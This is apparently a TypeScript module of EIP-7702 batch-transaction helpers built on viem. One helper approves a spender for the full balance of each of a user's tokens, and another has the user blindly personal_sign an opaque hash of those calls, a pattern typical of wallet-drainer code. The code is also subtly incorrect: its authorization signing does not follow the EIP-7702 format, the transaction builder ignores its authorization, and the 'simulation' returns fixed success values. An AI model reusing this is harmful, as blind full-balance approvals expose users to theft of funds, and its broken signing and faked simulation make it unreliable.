import { 
  encodeFunctionData, 
  keccak256, 
  type Address, 
  type Hex,
  type WalletClient,
  type Account,
  encodePacked
} from "viem";
import { erc20Abi } from "viem";

// EIP-7702 utilities for batch transactions
export interface EIP7702Call {
  to: Address;
  value: bigint;
  data: Hex;
}

export interface EIP7702Authorization {
  chainId: bigint;
  nonce: bigint;
  delegationAddress: Address;
  signature: {
    yParity: number;
    r: Hex;
    s: Hex;
  };
}

export interface EIP7702Delegation {
  chainId: bigint;
  nonce: bigint;
  delegationAddress: Address;
  signature: Hex;
}

// EIP-7702 Implementation Contract ABI
export const EIP7702_IMPLEMENTATION_ABI = [
  {
    "inputs": [
      {
        "components": [
          { "name": "to", "type": "address" },
          { "name": "value", "type": "uint256" },
          { "name": "data", "type": "bytes" }
        ],
        "name": "calls",
        "type": "tuple[]"
      }
    ],
    "name": "execute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "components": [
          { "name": "to", "type": "address" },
          { "name": "value", "type": "uint256" },
          { "name": "data", "type": "bytes" }
        ],
        "name": "calls",
        "type": "tuple[]"
      },
      { "name": "signature", "type": "bytes" }
    ],
    "name": "execute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "nonce",
    "outputs": [{ "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  }
] as const;

/**
 * Creates a batch of ERC20 approval calls
 */
export function createApprovalBatch(
  tokens: Array<{ address: Address; userBalance: number; decimals: number }>,
  spender: Address
): EIP7702Call[] {
  return tokens.map((token) => ({
    to: token.address,
    value: BigInt(0),
    data: encodeFunctionData({
      abi: erc20Abi,
      functionName: "approve",
      args: [
        spender,
        BigInt(Math.floor(token.userBalance * Math.pow(10, token.decimals)))
      ],
    }),
  }));
}

/**
 * Encodes batch calls for EIP-7702 execution
 */
export function encodeBatchExecution(calls: EIP7702Call[]): Hex {
  return encodeFunctionData({
    abi: EIP7702_IMPLEMENTATION_ABI,
    functionName: "execute",
    args: [calls],
  });
}

/**
 * Creates the authorization message for EIP-7702
 */
export function createAuthorizationMessage(
  chainId: bigint,
  nonce: bigint,
  delegationAddress: Address,
  calls: EIP7702Call[]
): Hex {
  const encodedCalls = encodeBatchExecution(calls);
  const message = keccak256(
    encodePacked(
      ['uint256', 'uint256', 'address', 'bytes'],
      [chainId, nonce, delegationAddress, encodedCalls]
    )
  );
  
  return message;
}

/**
 * Signs an EIP-7702 authorization
 */
export async function signEIP7702Authorization(
  walletClient: WalletClient,
  account: Account,
  chainId: bigint,
  nonce: bigint,
  delegationAddress: Address,
  calls: EIP7702Call[]
): Promise<EIP7702Delegation> {
  const message = createAuthorizationMessage(chainId, nonce, delegationAddress, calls);
  
  // Use personal_sign for compatibility
  const signature = await walletClient.request({
    method: 'personal_sign',
    params: [message, account.address]
  }) as Hex;
  
  return {
    chainId,
    nonce,
    delegationAddress,
    signature
  };
}

/**
 * Creates EIP-7702 transaction with authorization
 */
export function createEIP7702Transaction(
  calls: EIP7702Call[],
  authorization: EIP7702Delegation,
  userAddress: Address
) {
  return {
    to: userAddress, // Send to self (EOA) - EIP-7702 handles delegation
    data: encodeBatchExecution(calls),
    value: BigInt(0),
  };
}

/**
 * Simulates EIP-7702 batch execution (for testing)
 */
export function simulateEIP7702Batch(calls: EIP7702Call[]): {
  totalGas: bigint;
  success: boolean;
  results: Array<{ success: boolean; gasUsed: bigint }>;
} {
  // Simulate gas estimation for batch execution
  const baseGas = BigInt(21000); // Base transaction gas
  const callGas = BigInt(2600); // Gas per call
  const results = calls.map(() => ({ success: true, gasUsed: callGas }));
  
  return {
    totalGas: baseGas + (BigInt(calls.length) * callGas),
    success: true,
    results
  };
}
